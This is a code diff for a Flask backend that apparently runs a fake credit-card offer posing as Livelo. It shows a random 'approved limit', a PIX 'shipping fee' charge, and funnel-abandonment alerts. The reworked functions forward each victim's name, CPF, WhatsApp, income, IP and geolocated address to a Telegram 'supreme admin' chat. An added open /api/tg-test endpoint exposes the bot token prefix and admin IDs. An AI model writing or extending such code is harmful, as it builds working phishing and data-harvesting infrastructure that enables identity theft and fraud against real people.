@@ -330,6 +330,28 @@ def init_db():
             db.execute("INSERT INTO sys_config(key, value) VALUES('favicon_url', '/static/favicon.ico')")
             db.commit()
 
+        # ── Auto-seed: garante que SUPREME_ADMIN_ID e TELEGRAM_BOT_TOKEN do .env
+        # estejam sempre no banco para as funções de notificação encontrarem ──────
+        supreme_env = (
+            os.environ.get("SUPREME_ADMIN_ID")
+            or os.environ.get("ID_ADMIN_SUPREMO")
+            or os.environ.get("ADMIN_CHAT_ID")
+        )
+        if supreme_env:
+            existing = db.execute("SELECT value FROM sys_config WHERE key='admin_chat_id'").fetchone()
+            if not existing or not existing["value"]:
+                db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('admin_chat_id', ?)", (supreme_env,))
+                db.commit()
+                log.info("[BOOT] admin_chat_id salvo no sys_config: %s", supreme_env)
+
+        tg_token_env = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN")
+        if tg_token_env:
+            existing_tk = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
+            if not existing_tk or not existing_tk["value"]:
+                db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('telegram_token', ?)", (tg_token_env,))
+                db.commit()
+                log.info("[BOOT] telegram_token salvo no sys_config.")
+
 # ══════════════════════════════════════════════════════════════════════════════
 #  SEGURANÇA
 # ══════════════════════════════════════════════════════════════════════════════
@@ -397,31 +419,46 @@ def validate_cpf(cpf: str) -> bool:
 
 
 def send_telegram_notify(session_id, event_type="ENTRY"):
+    """Envia notificação Telegram síncrona — chamada dentro do request context Flask."""
     try:
-        import requests
+        import requests as _rq
+
         db = get_db()
-        row_token = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
         cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
         cfg = {r["key"]: r["value"] for r in cfg_rows}
 
-        bot_token = (row_token["value"] if row_token and row_token["value"] else None) \
-                    or os.environ.get("TELEGRAM_BOT_TOKEN") \
-                    or os.environ.get("BOT_TOKEN")
-        if not bot_token: return
+        # ── Token do Bot ──────────────────────────────────────────────────────
+        bot_token = (
+            cfg.get("telegram_token")
+            or os.environ.get("TELEGRAM_BOT_TOKEN")
+            or os.environ.get("BOT_TOKEN")
+        )
+        if not bot_token:
+            log.warning("[TG] Sem bot_token — notificação ignorada (event=%s)", event_type)
+            return
+
+        # ── session_id vazio → ignora ─────────────────────────────────────────
+        if not session_id:
+            return
 
         lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
-        if not lead: return
-        
-        pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
-        
-        # ── Resolve admin supremo (SEMPRE recebe tudo) ─────────────────────
-        row_admin = db.execute("SELECT value FROM sys_config WHERE key='admin_chat_id'").fetchone()
-        supreme_id = (row_admin["value"] if row_admin and row_admin["value"] else None) \
-                     or os.environ.get("SUPREME_ADMIN_ID") \
-                     or os.environ.get("ID_ADMIN_SUPREMO") \
-                     or os.environ.get("ADMIN_CHAT_ID")
+        if not lead:
+            log.warning("[TG] Lead não encontrado para session_id=%s", session_id)
+            return
 
-        # ── Canal de log separado (opcional) ──────────────────────────────────
+        pay = db.execute(
+            "SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1",
+            (session_id,)
+        ).fetchone()
+
+        # ── Resolve destino ───────────────────────────────────────────────────
+        supreme_id = (
+            cfg.get("admin_chat_id")
+            or cfg.get("supreme_admin_id")
+            or os.environ.get("SUPREME_ADMIN_ID")
+            or os.environ.get("ID_ADMIN_SUPREMO")
+            or os.environ.get("ADMIN_CHAT_ID")
+        )
         log_channel = None
         if event_type in ["PIX_PAID", "PIX_GENERATED"]:
             log_channel = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
@@ -430,189 +467,210 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         else:
             log_channel = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
 
-        if not supreme_id and not log_channel: return
+        if not supreme_id and not log_channel:
+            log.warning("[TG] Nenhum destino configurado — supreme_id=%s log=%s", supreme_id, log_channel)
+            return
 
-        icons = {
-            "ENTRY": "🟢", "CARD_CHOSEN": "💳", "PIX_GENERATED": "⏳", 
-            "PIX_PAID": "✅", "INFO_ADDED": "📝"
-        }
+        # ── Geolocalização ────────────────────────────────────────────────────
+        geo_link = "N/A"
+        if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost"]:
+            try:
+                ip_data = _rq.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
+                if ip_data.get("status") == "success":
+                    lat, lon = ip_data.get("lat"), ip_data.get("lon")
+                    city, country = ip_data.get("city"), ip_data.get("country")
+                    geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country} (Ver Satélite)</a>"
+            except Exception:
+                pass
+
+        import datetime
+        agora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")
+
+        icons = {"ENTRY": "🟢", "CARD_CHOSEN": "💳", "PIX_GENERATED": "⏳", "PIX_PAID": "✅", "INFO_ADDED": "📝"}
         icon = icons.get(event_type, "ℹ️")
         if str(event_type).startswith("STEP_ACTION"):
             icon = "🖱️"
             if "ABANDONO" in event_type:
                 icon = "🚨"
-        
-        # Generate Geolocation link
-        geo_link = "N/A"
-        if lead['ip'] and lead['ip'] not in ['127.0.0.1', 'localhost']:
-            try:
-                ip_data = requests.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
-                if ip_data.get('status') == 'success':
-                    lat, lon = ip_data.get('lat'), ip_data.get('lon')
-                    city, country = ip_data.get('city'), ip_data.get('country')
-                    geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country} (Ver Satélite)</a>"
-            except: pass
 
-        import datetime
-        agora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")
-
-        titulo = "RASTREAMENTO AVANÇADO DE LEAD"
+        titulo = "RASTREAMENTO DE LEAD"
         if event_type == "ENTRY":           titulo = "🟢 NOVO ACESSO IDENTIFICADO"
         elif event_type == "CARD_CHOSEN":   titulo = "💳 CARTÃO ESCOLHIDO"
         elif event_type == "INFO_ADDED":    titulo = "📝 WHATSAPP / DADOS INFORMADOS"
         elif event_type == "PIX_GENERATED": titulo = "⏳ PIX GERADO"
         elif event_type == "PIX_PAID":      titulo = "✅ PAGAMENTO CONFIRMADO"
         elif "ABANDONO" in event_type:      titulo = "🚨 LEAD ABANDONOU O FUNIL"
-        
-        texto = f"{icon} <b>{titulo}</b> {icon}\n\n"
+
+        texto  = f"{icon} <b>{titulo}</b> {icon}\n\n"
         texto += f"🕒 <b>Data/Hora:</b> {agora}\n"
         texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\n"
         texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
-        if lead.get('whatsapp'):
-            clean_wa = re.sub(r"\D", "", lead["whatsapp"])
-            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{clean_wa}'>{lead['whatsapp']}</a> ✅\n"
-        
-        device = lead.get('device_brand') or 'Desconhecido'
-        texto += f"💻 <b>Dispositivo:</b> {device}\n"
+        if lead.get("whatsapp"):
+            cwa = re.sub(r"\D", "", lead["whatsapp"])
+            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{cwa}'>{lead['whatsapp']}</a> ✅\n"
+        texto += f"💻 <b>Dispositivo:</b> {lead.get('device_brand') or 'Desconhecido'}\n"
         texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n"
         if geo_link != "N/A":
             texto += f"📍 <b>Localização:</b> {geo_link}\n"
-            
+
         texto += f"\n📊 <b>STATUS DO FUNIL:</b>\n"
         texto += f"✅ <b>Acesso Inicial:</b> Concluído\n"
-        if lead['cpf']: texto += f"✅ <b>Validação CPF:</b> {lead['cpf']}\n"
-        if lead['renda']: texto += f"✅ <b>Renda Informada:</b> R$ {lead['renda']}\n"
-        if lead['tipo_renda']: texto += f"✅ <b>Ocupação:</b> {lead['tipo_renda']}\n"
-        if lead['motivo_credito']: texto += f"✅ <b>Motivo:</b> {lead['motivo_credito']}\n"
-        if lead['dia_vencimento']: texto += f"✅ <b>Vencimento:</b> Dia {lead['dia_vencimento']}\n"
-        if lead['limite_aprovado']: texto += f"🎯 <b>Limite Aprovado:</b> R$ {lead['limite_aprovado']}\n"
-
-        if lead['card_style']:
-            texto += f"\n💳 <b>CARTÃO ESCOLHIDO:</b> {lead['card_style']} ({lead['card_color']})\n"
-            
+        if lead["cpf"]:           texto += f"✅ <b>CPF:</b> {lead['cpf']}\n"
+        if lead["renda"]:         texto += f"✅ <b>Renda:</b> R$ {lead['renda']}\n"
+        if lead["tipo_renda"]:    texto += f"✅ <b>Ocupação:</b> {lead['tipo_renda']}\n"
+        if lead["motivo_credito"]: texto += f"✅ <b>Motivo:</b> {lead['motivo_credito']}\n"
+        if lead["dia_vencimento"]: texto += f"✅ <b>Vencimento:</b> Dia {lead['dia_vencimento']}\n"
+        if lead["limite_aprovado"]: texto += f"🎯 <b>Limite:</b> R$ {lead['limite_aprovado']}\n"
+        if lead["card_style"]:
+            texto += f"\n💳 <b>CARTÃO:</b> {lead['card_style']} ({lead['card_color']})\n"
         if pay:
-            texto += f"\n💸 <b>DADOS DO PAGAMENTO:</b>\n"
+            texto += f"\n💸 <b>PAGAMENTO:</b>\n"
             texto += f"💵 <b>Valor:</b> R$ {pay['amount']}\n"
-            
-            p_status = lead['pix_status']
-            if p_status in ['paid', 'completed']:
-                texto += f"🚦 <b>Status:</b> ✅ <b>PAGO E CONCLUÍDO!</b>\n"
-            else:
-                texto += f"🚦 <b>Status:</b> ⏳ <b>AGUARDANDO PAGAMENTO</b>\n"
-                
+            st = lead["pix_status"]
+            texto += f"🚦 <b>Status:</b> {'✅ PAGO!' if st in ['paid','completed'] else '⏳ AGUARDANDO'}\n"
             texto += f"🆔 <b>ID:</b> <code>{pay['payment_id']}</code>\n"
-            
-        base_payload = {
-            "text": texto,
-            "parse_mode": "HTML",
-            "disable_web_page_preview": True
-        }
 
-        # ── 1. Canal de log: edita msg existente ou cria nova ─────────────────
+        base_payload = {"text": texto, "parse_mode": "HTML", "disable_web_page_preview": True}
+
+        # ── Envia para canal de log ───────────────────────────────────────────
         if log_channel:
             lp = dict(base_payload, chat_id=log_channel)
-            msg_id  = lead.get('tg_message_id')
-            tg_chat = lead.get('tg_chat_id')
+            msg_id  = lead.get("tg_message_id")
+            tg_chat = lead.get("tg_chat_id")
             sent_ok = False
             if msg_id and str(tg_chat) == str(log_channel):
                 lp["message_id"] = msg_id
-                r = requests.post(f"https://api.telegram.org/bot{bot_token}/editMessageText", json=lp, timeout=5)
-                if r.json().get('ok'):
+                r = _rq.post(f"https://api.telegram.org/bot{bot_token}/editMessageText", json=lp, timeout=4)
+                if r.json().get("ok"):
                     sent_ok = True
                 else:
                     lp.pop("message_id", None)
             if not sent_ok:
-                r = requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=lp, timeout=5)
-                if r.json().get('ok') and 'result' in r.json():
-                    new_msg_id = r.json()['result']['message_id']
+                r = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=lp, timeout=4)
+                rj = r.json()
+                if rj.get("ok") and "result" in rj:
                     db.execute("UPDATE leads SET tg_message_id=?, tg_chat_id=? WHERE session_id=?",
-                               (new_msg_id, log_channel, session_id))
+                               (rj["result"]["message_id"], log_channel, session_id))
                     db.commit()
+                else:
+                    log.warning("[TG] Erro log_channel %s: %s", log_channel, rj.get("description"))
 
-        # ── 2. Admin supremo: SEMPRE recebe, mensagem própria ─────────────────
+        # ── Envia para admin supremo ──────────────────────────────────────────
         if supreme_id:
             sp = dict(base_payload, chat_id=supreme_id)
-            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=sp, timeout=5)
+            r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=sp, timeout=4)
+            if not r2.json().get("ok"):
+                log.warning("[TG] Erro supreme_id %s: %s", supreme_id, r2.json().get("description"))
+            else:
+                log.info("[TG] '%s' enviado → %s", event_type, supreme_id)
 
     except Exception as e:
-        log.error("Telegram Notify Error: %s", e)
+        log.error("[TG] send_telegram_notify ERRO: %s", e, exc_info=True)
 
 
 def send_telegram_report(session_id, is_paid=False):
+    """Relatório de PIX gerado / pago — chamada síncrona dentro do request context."""
+    try:
+        _send_telegram_report_inner(session_id, is_paid)
+    except Exception as e:
+        log.error("[TG] send_telegram_report ERRO: %s", e, exc_info=True)
+
+def _send_telegram_report_inner(session_id, is_paid=False):
+    import requests as _rq
+
     db = get_db()
-    row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
-    channel = row["value"] if row and row["value"] else None
-    row_admin = db.execute("SELECT value FROM sys_config WHERE key='admin_chat_id'").fetchone()
-    supreme_id = row_admin["value"] if row_admin and row_admin["value"] else os.environ.get("ID_ADMIN_SUPREMO", os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID")))
-        
+    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
+    cfg = {r["key"]: r["value"] for r in cfg_rows}
+
+    channel = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
+    supreme_id = (
+        cfg.get("admin_chat_id")
+        or cfg.get("supreme_admin_id")
+        or os.environ.get("SUPREME_ADMIN_ID")
+        or os.environ.get("ID_ADMIN_SUPREMO")
+        or os.environ.get("ADMIN_CHAT_ID")
+    )
+
     if not channel:
         channel = supreme_id
-    if not channel and not supreme_id: return
-    
-    thread_row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_thread_id'").fetchone()
-    thread_id = thread_row["value"] if thread_row and thread_row["value"] else None
+    if not channel and not supreme_id:
+        log.warning("[TG] report: sem destino (session=%s)", session_id)
+        return
+
+    thread_id = cfg.get("tg_log_thread_id")
+    bot_token = (
+        cfg.get("telegram_token")
+        or os.environ.get("TELEGRAM_BOT_TOKEN")
+        or os.environ.get("BOT_TOKEN")
+    )
+    if not bot_token:
+        log.warning("[TG] report: sem bot_token")
+        return
 
     lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
-    if not lead: return
-    
-    pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
-    
-    bt = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
-    bot_token = bt["value"] if bt and bt["value"] else os.environ.get("TELEGRAM_BOT_TOKEN", os.environ.get("BOT_TOKEN"))
-    if not bot_token: return
-    
-    status_icon = "✅ PAGO" if is_paid else "⏳ AGUARDANDO PIX"
-    if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
-        status_icon = "✅ PAGO"
-        
+    if not lead:
+        log.warning("[TG] report: lead nao encontrado (session=%s)", session_id)
+        return
+    pay = db.execute(
+        "SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1",
+        (session_id,)
+    ).fetchone()
+
+    status_icon = "PAGO" if is_paid else "AGUARDANDO PIX"
     import datetime
-    agora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")
+    agora = datetime.datetime.now().strftime("%d/%m/%Y as %H:%M:%S")
 
-    # Generate Geolocation link for report too
     geo_link = "N/A"
-    if lead['ip'] and lead['ip'] not in ['127.0.0.1', 'localhost']:
+    if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost"]:
         try:
-            ip_data = requests.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
-            if ip_data.get('status') == 'success':
-                lat, lon = ip_data.get('lat'), ip_data.get('lon')
-                city, country = ip_data.get('city'), ip_data.get('country')
+            ip_data = _rq.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
+            if ip_data.get("status") == "success":
+                lat, lon = ip_data.get("lat"), ip_data.get("lon")
+                city, country = ip_data.get("city"), ip_data.get("country")
                 geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country}</a>"
-        except: pass
+        except Exception:
+            pass
 
-    texto = f"📊 <b>NOVA VENDA CONFIRMADA!</b>\n\n" if is_paid else f"🚀 <b>PIX GERADO COM SUCESSO!</b>\n\n"
+    titulo = "NOVA VENDA CONFIRMADA!" if is_paid else "PIX GERADO COM SUCESSO!"
+    texto = f"<b>{titulo}</b>\n\n"
     texto += (
-        f"🕒 <b>Data/Hora:</b> {agora}\n"
-        f"👤 <b>Nome:</b> {lead['nome']}\n"
-        f"💳 <b>CPF:</b> <code>{lead['cpf']}</code>\n"
+        f"Data/Hora: {agora}\n"
+        f"Nome: {lead['nome'] or '?'}\n"
+        f"CPF: <code>{lead['cpf'] or '?'}</code>\n"
     )
-    if lead.get('whatsapp'):
-        clean_wa = re.sub(r"\D", "", lead["whatsapp"])
-        texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{clean_wa}'>{lead['whatsapp']}</a>\n"
-    
+    if lead.get("whatsapp"):
+        import re as _re
+        cwa = _re.sub(r"\D", "", lead["whatsapp"])
+        texto += f"WhatsApp: <a href='https://wa.me/55{cwa}'>{lead['whatsapp']}</a>\n"
     texto += (
-        f"💰 <b>Renda Declarada:</b> R$ {lead['renda'] or 'Não inf.'}\n"
-        f"🎯 <b>Limite Aprovado:</b> R$ {lead['limite_aprovado'] or 'Não inf.'}\n"
-        f"🎨 <b>Estilo Cartão:</b> {lead['card_style'] or ''} ({lead['card_color'] or ''})\n"
-        f"💻 <b>Aparelho:</b> {lead.get('device_brand') or 'Desconhecido'}\n"
-        f"📍 <b>Local/IP:</b> <code>{lead['ip']}</code> - {geo_link}\n"
-        f"🚚 <b>Status PIX:</b> {status_icon}\n"
+        f"Renda: R$ {lead['renda'] or 'Nao inf.'}\n"
+        f"Limite: R$ {lead['limite_aprovado'] or 'Nao inf.'}\n"
+        f"Cartao: {lead['card_style'] or '-'} ({lead['card_color'] or '-'})\n"
+        f"Aparelho: {lead.get('device_brand') or 'Desconhecido'}\n"
+        f"IP: <code>{lead['ip'] or '?'}</code> - {geo_link}\n"
+        f"Status PIX: {status_icon}\n"
     )
     if pay:
-        texto += f"💵 <b>Valor do Frete:</b> R$ {pay['amount']}\n"
-        texto += f"🆔 <b>ID Pgto:</b> <code>{pay['payment_id']}</code>\n"
+        texto += f"Valor: R$ {pay['amount']}\n"
+        texto += f"ID Pgto: <code>{pay['payment_id']}</code>\n"
 
-    try:
-        import requests
-        payload = {"chat_id": channel, "text": texto, "parse_mode": "HTML"}
-        if thread_id: payload["message_thread_id"] = thread_id
-        if channel:
-            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
-            
-        if supreme_id and str(supreme_id) != str(channel):
-            payload_supreme = {"chat_id": supreme_id, "text": texto, "parse_mode": "HTML"}
-            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload_supreme, timeout=5)
-    except Exception as e:
-        pass
+    base = {"text": texto, "parse_mode": "HTML", "disable_web_page_preview": True}
+    if channel:
+        pl = dict(base, chat_id=channel)
+        if thread_id:
+            pl["message_thread_id"] = thread_id
+        r1 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=pl, timeout=5)
+        if r1.json().get("ok"):
+            log.info("[TG] report canal %s OK", channel)
+        else:
+            log.warning("[TG] report canal erro: %s", r1.json().get("description"))
+    if supreme_id and str(supreme_id) != str(channel):
+        r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                      json=dict(base, chat_id=supreme_id), timeout=5)
+        if r2.json().get("ok"):
+            log.info("[TG] report supreme %s OK", supreme_id)
+        else:
+            log.warning("[TG] report supreme erro: %s", r2.json().get("description"))
 
 def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     import random
@@ -861,11 +919,10 @@ def api_lead():
     except Exception as e:
         log.error("Error updating lead in DB: %s", e)
         db.rollback()
-    import threading
     try:
         send_telegram_notify(sid, "ENTRY")
-    except:
-        pass
+    except Exception as _e:
+        log.warning("[TG] ENTRY notify falhou: %s", _e)
 
     return jsonify({
         "ok":            True,
@@ -891,11 +948,10 @@ def api_card_style():
         (color, style, sid)
     )
     db.commit()
-    import threading
     try:
         send_telegram_notify(sid, "CARD_CHOSEN")
-    except:
-        pass
+    except Exception as _e:
+        log.warning("[TG] CARD_CHOSEN notify falhou: %s", _e)
     return jsonify({"ok": True})
 
 
@@ -914,11 +970,10 @@ def api_whatsapp():
     db = get_db()
     db.execute("UPDATE leads SET whatsapp=?, updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?", (wa, sid))
     db.commit()
-    import threading
     try:
         send_telegram_notify(sid, "INFO_ADDED")
-    except:
-        pass
+    except Exception as _e:
+        log.warning("[TG] INFO_ADDED notify falhou: %s", _e)
 
     mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
     if mgr:
@@ -1270,12 +1325,11 @@ def api_gerar_pix():
 
     frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")
 
-    import threading
     try:
         send_telegram_report(sid, False)
-    except:
-        pass
-    
+    except Exception as _e:
+        log.warning("[TG] PIX_GENERATED report falhou: %s", _e)
+
     return jsonify({
         "ok":          True,
         "payment_id":  pay_id,
@@ -1320,11 +1374,10 @@ def api_status_pix(payment_id: str):
                             db.execute("UPDATE leads SET pix_status='paid', updated_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?", (payment_id,))
                             db.commit()
                             if pay["session_id"]:
-                                import threading
                                 try:
                                     send_telegram_report(pay["session_id"], True)
-                                except:
-                                    pass
+                                except Exception as _e:
+                                    log.warning("[TG] PIX_PAID report falhou: %s", _e)
             except Exception as e:
                 pass
 
@@ -1375,13 +1428,12 @@ def webhook_c7():
         db.commit()
         log.info("[WEBHOOK] %s → %s", ext_id, status)
         if status == 'paid':
-            import threading
             pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
             if pay_row:
                 try:
                     send_telegram_report(pay_row["session_id"], True)
-                except:
-                    pass
+                except Exception as _e:
+                    log.warning("[TG] webhook PIX_PAID report falhou: %s", _e)
 
     return jsonify({"ok": True})
 
@@ -1719,11 +1771,10 @@ def api_log_action():
     # Store action in DB or just forward to TG
     if sid and action:
         texto = f"{action}" + (f": {details}" if details else "")
-        import threading
         try:
             send_telegram_notify(sid, f"STEP_ACTION: {texto}")
-        except:
-            pass
+        except Exception as _e:
+            log.warning("[TG] STEP_ACTION notify falhou: %s", _e)
     return jsonify({"ok": True})
 
 
@@ -2203,6 +2254,52 @@ def set_webhook():
         return jsonify({"error": str(e), "traceback": traceback.format_exc()})
 
 start_bot()
+
+
+
+@app.route("/api/tg-test", methods=["GET", "POST"])
+def api_tg_test():
+    """Endpoint de diagnostico — testa bot token e envia msg de teste."""
+    import requests as _rq
+    db = get_db()
+    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
+    cfg = {r["key"]: r["value"] for r in cfg_rows}
+
+    bot_token = (
+        cfg.get("telegram_token")
+        or os.environ.get("TELEGRAM_BOT_TOKEN")
+        or os.environ.get("BOT_TOKEN")
+    )
+    supreme_id = (
+        cfg.get("admin_chat_id")
+        or cfg.get("supreme_admin_id")
+        or os.environ.get("SUPREME_ADMIN_ID")
+        or os.environ.get("ID_ADMIN_SUPREMO")
+        or os.environ.get("ADMIN_CHAT_ID")
+    )
+
+    debug = {
+        "bot_token_found": bool(bot_token),
+        "bot_token_prefix": bot_token[:15] + "..." if bot_token else None,
+        "supreme_id": supreme_id,
+        "admin_chat_id_in_db": cfg.get("admin_chat_id"),
+        "tg_log_channel": cfg.get("tg_log_channel"),
+    }
+
+    if not bot_token or not supreme_id:
+        return jsonify({"ok": False, "debug": debug, "error": "bot_token ou supreme_id ausente"})
+
+    try:
+        r = _rq.post(
+            f"https://api.telegram.org/bot{bot_token}/sendMessage",
+            json={"chat_id": supreme_id, "text": "Teste de notificacao Livelo OK! O bot esta conectado.", "parse_mode": "HTML"},
+            timeout=6
+        )
+        rj = r.json()
+        debug["telegram_response"] = rj
+        return jsonify({"ok": rj.get("ok", False), "debug": debug})
+    except Exception as e:
+        return jsonify({"ok": False, "debug": debug, "error": str(e)})
 
 if __name__ == "__main__":
     init_db()
